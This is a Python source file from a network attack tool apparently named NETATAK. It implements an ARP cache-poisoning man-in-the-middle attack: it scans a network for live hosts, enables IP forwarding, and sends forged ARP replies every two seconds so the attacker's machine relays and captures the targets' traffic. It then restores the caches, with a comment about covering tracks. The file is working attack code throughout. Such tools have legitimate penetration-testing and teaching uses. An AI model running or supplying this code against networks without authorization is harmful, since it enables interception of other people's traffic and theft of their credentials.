"""
Copyright (C) 2020 Tyrone Westall

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

# ARP MITM
# This tool will start by requesting details of the router IP and the target machine/network. It will then conduct
# an ARP scan on the network and find out which hosts are alive. Once a target list has been generated the program will
# poison the target and router ARP caches so that the machine running NETATAK acts as the default gateway for the
# targets, forwarding traffic to the real default gateway. You will then be able to use Wireshark to monitor the
# forwarded traffic. On exit the ARP caches are restored and IP forwarding is turned back off.

import platform
import subprocess
import time
from scapy.all import ARP, send
from netscanner.arpscan import ARPscanner

# Define text colours
B, R, Y, G, N = '\033[1;34m', '\033[1;31m', '\033[1;33m', '\033[1;32m', '\033[1;37m'

# How often (in seconds) the ARP caches are re-poisoned to keep the MITM alive.
# This must be short: an active host re-confirms the real gateway's MAC within a
# second or two of its own traffic, so a long interval leaves the cache poisoned
# only briefly and most intercepted queries would be missed.
POISON_INTERVAL = 2


def is_windows():
    return platform.system().lower() == "windows"


def windows_forwarding_command(enabled):
    # Build the PowerShell command that toggles IPv4 forwarding on every interface.
    # Set-NetIPInterface takes effect immediately and does not require a reboot
    # (unlike the IPEnableRouter registry key).
    state = "Enabled" if enabled else "Disabled"
    return [
        "powershell", "-NoProfile", "-NonInteractive", "-Command",
        "Set-NetIPInterface -AddressFamily IPv4 -Forwarding {0}".format(state),
    ]


# Define the class
class arp_mitm:
    def __init__(self, target, rtrip, atkopt, timeout=10, pktintr=0.1, verbose=1):
        # Netscanner/MITM variables
        self.target = target  # Target machine/network
        self.rtrip = rtrip  # Default gateway for the network
        self.atkopt = atkopt  # 0 = Start MITM, 1 = Stop MITM
        self.timeout = timeout  # Response timeout value
        self.pktintr = float(pktintr)  # Interval between packets
        self.verbose = verbose
        self.rtr_scan = {}
        self.rtrmac = ""
        self.tgt_list = {}

        # Linux - IP Forwarding file name
        self.ipforward_file = "/proc/sys/net/ipv4/ip_forward"

    def set_ip_forwarding(self, enabled):
        # Enable/disable IPv4 forwarding using the mechanism appropriate to the host OS.
        # NETATAK already requires elevated privileges, so neither path needs sudo.
        if is_windows():
            ok = self._set_ip_forwarding_windows(enabled)
        else:
            ok = self._set_ip_forwarding_linux(enabled)
        if ok and self.verbose == 1:
            print("{0}[*] IP forwarding turned {1}.".format(N, "on" if enabled else "off"))
        return ok

    def _set_ip_forwarding_linux(self, enabled):
        # Write the proc file directly (we are root). The old 'sudo echo > file' form
        # silently failed because the redirect ran in the unprivileged shell.
        value = "1" if enabled else "0"
        try:
            with open(self.ipforward_file, "w") as forward_file:
                forward_file.write(value + "\n")
            return True
        except OSError as error:
            print("{0}[*] Error: could not write IP forwarding setting to {1}: {2}".format(R, self.ipforward_file, error))
            return False

    def _set_ip_forwarding_windows(self, enabled):
        # Toggle IPv4 forwarding on all interfaces via Set-NetIPInterface.
        try:
            result = subprocess.run(
                windows_forwarding_command(enabled),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
            )
        except OSError as error:
            print("{0}[*] Error: could not run PowerShell to change IP forwarding: {1}".format(R, error))
            return False
        if result.returncode != 0:
            print("{0}[*] Error: failed to set IP forwarding on Windows: {1}".format(R, (result.stderr or "").strip()))
            return False
        return True

    # Call netscanner to conduct an ARP scan of the target/network and build the target list, get mac addresses from all responses
    def find_targets(self):
        self.tgt_list = ARPscanner(
            self.target,
            self.timeout,
            self.pktintr,
            inc_mac=1,
            count=1,
            verbose=self.verbose,
        ).arpscan()
        if self.verbose == 1:
            print("{0}[*] Obtaining Router MAC Address...".format(N))
        self.rtr_scan = ARPscanner(
            self.rtrip,
            self.timeout,
            self.pktintr,
            inc_mac=1,
            count=1,
            verbose=0,
        ).arpscan()

        if not self.tgt_list:
            print("{0}[*] No targets found via ARP scan. Exiting...".format(R))
            return False
        # Targets found, remove the router from the target list if it responded via ARP. If the router was the only response, then exit the script.
        for key, value in list(self.tgt_list.items()):
            ip_check = value.split('-')
            if self.rtrip == ip_check[0]:
                self.tgt_list.pop(key)
                if self.verbose == 1:
                    print("{0}[*] Router %s removed from target list".format(B) % self.rtrip)
                break
        if len(self.tgt_list) == 0:
            print("{0}[*] No valid targets remaining. Exiting...".format(R))
            return False

        if not self.rtr_scan:
            print("{0}[*] Router IP did not respond to ARP request. Exiting...".format(R))
            return False
        router_found = False
        for key, value in self.rtr_scan.items():
            if self.rtrip in value:
                self.rtrmac = value.split('-')[1]
                router_found = True
                break
        if not router_found:
            print("{0}[*] Router IP did not respond to ARP request. Exiting...".format(R))
            return False

        if self.atkopt == 0:
            # Start ARP MITM
            return self.start_arp_mitm()
        else:
            # Stop ARP MITM
            return self.stop_arp_mitm()

    def start_arp_mitm(self):
        if self.verbose == 1:
            print("{0}[*] Starting ARP MITM attack...".format(N))
        # Forwarding must be enabled regardless of verbosity, otherwise intercepted
        # traffic is black-holed instead of being relayed to the real gateway.
        self.set_ip_forwarding(True)
        if self.verbose == 1:
            print("{0}[*] Use Wireshark or a similar network analysis tool to monitor the traffic.".format(Y))
            print("{0}[*] NETATAK will poison the target ARP caches every {1} seconds.".format(N, POISON_INTERVAL))
        try:
            while True:
                # Poison every target (and the matching router entry) in each round, then
                # wait once - the old code slept between individual targets.
                for i in self.tgt_list:
                    result = self.tgt_list[i].split('-')
                    send(ARP(op=2, pdst=result[0], psrc=self.rtrip, hwdst=result[1]), count=1, verbose=0)
                    send(ARP(op=2, pdst=self.rtrip, psrc=result[0], hwdst=self.rtrmac), count=1, verbose=0)
                    if self.verbose == 1:
                        print("{0}[*] Target %s with MAC Address %s poisoned".format(G) % (result[0], result[1]))
                time.sleep(POISON_INTERVAL)
        except KeyboardInterrupt:
            print("{0}[*] ARP MITM Attack stopped by user.".format(R))
            return self.stop_arp_mitm()

    def stop_arp_mitm(self):
        print("{0}[*] Stopping ARP MITM attack...".format(N))
        # Re-ARP the target(s) and router so that their traffic flows to the correct destinations, this will (hopefully) cover our tracks
        for i in self.tgt_list:
            result = self.tgt_list[i].split('-')
            send(ARP(op=2, pdst=result[0], psrc=self.rtrip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.rtrmac), verbose=0, count=5)
            send(ARP(op=2, pdst=self.rtrip, psrc=result[0], hwdst=self.rtrmac, hwsrc=result[1]), verbose=0, count=5)
            print("{0}[*] Target %s with MAC address %s restored".format(G) % (result[0], result[1]))

        # Turn IP Forwarding Off.
        self.set_ip_forwarding(False)

        print("{0}[*] Targets restored. Exiting...".format(G))
        time.sleep(5)
        return True
